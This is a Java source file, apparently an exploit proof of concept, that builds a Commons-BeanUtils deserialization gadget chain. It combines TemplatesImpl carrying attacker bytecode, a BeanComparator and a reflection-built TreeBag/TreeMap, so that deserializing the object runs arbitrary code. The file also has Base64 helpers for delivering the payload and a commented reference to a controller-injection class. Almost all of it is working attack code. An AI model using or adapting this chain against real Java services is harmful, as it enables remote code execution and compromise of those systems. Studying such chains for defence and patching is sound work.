import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;
import java.io.*;
import java.util.*;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.bag.TreeBag;
import sun.reflect.ReflectionFactory;

/*
 * 调用compare方法，TreeBag和TreeMap利用
 * 	at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:171)
 *  at java.util.TreeMap.compare(TreeMap.java:1291)
 *  at java.util.TreeMap.put(TreeMap.java:538)
 *	at org.apache.commons.collections.bag.AbstractMapBag.doReadObject(AbstractMapBag.java:513)
 *  at org.apache.commons.collections.bag.TreeBag.readObject(TreeBag.java:112)
 *
 */





public class cb {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class"));
//        byte[] code= Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\jackson\\InjectToController.class"));

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "zeropeach");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        BeanComparator comparator = new BeanComparator(null);

        setFieldValue(comparator, "property", "outputProperties");


        TreeBag treeBag = new TreeBag();
        TreeMap<Object,Object> m = new TreeMap<>();
        setFieldValue(m, "size", 2);
        setFieldValue(m, "modCount", 2);

        //这一部分相当于执行了TreeMap.put()
        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object MutableInteger = createWithoutConstructor("org.apache.commons.collections.bag.AbstractMapBag$MutableInteger");
        Object node = nodeCons.newInstance(obj,MutableInteger, null);
        Object right = nodeCons.newInstance(obj, MutableInteger, node);

      //为了保证在序列化时能够正常的遍历
        setFieldValue(m, "root", node);
      
        setFieldValue(node, "right", right);
        
        setFieldValue(m, "comparator", comparator);

        setFieldValue(treeBag,"map",m);
        

//        setFieldValue(queue, "queue", new Object[]{obj, obj});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(treeBag);
//        oos.writeObject(queue);
        oos.close();
//        String a = Base64.getEncoder().encodeToString(barr.toByteArray());
//        System.out.println(a);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(barr.toByteArray());

        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();



    }
    
    public static String base64serial(Object o) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }
    public static void base64deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
    public static void deserTester(Object o) throws Exception {
        base64deserial(base64serial(o));
    }
    public static Object createWithoutConstructor(String classname) throws Exception {
        return createWithoutConstructor(Class.forName(classname));
    }
    public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws Exception {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }
    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws Exception {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }
    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.setAccessible(true);
        if(field != null) {
            field.set(obj, value);
        }
    }

}
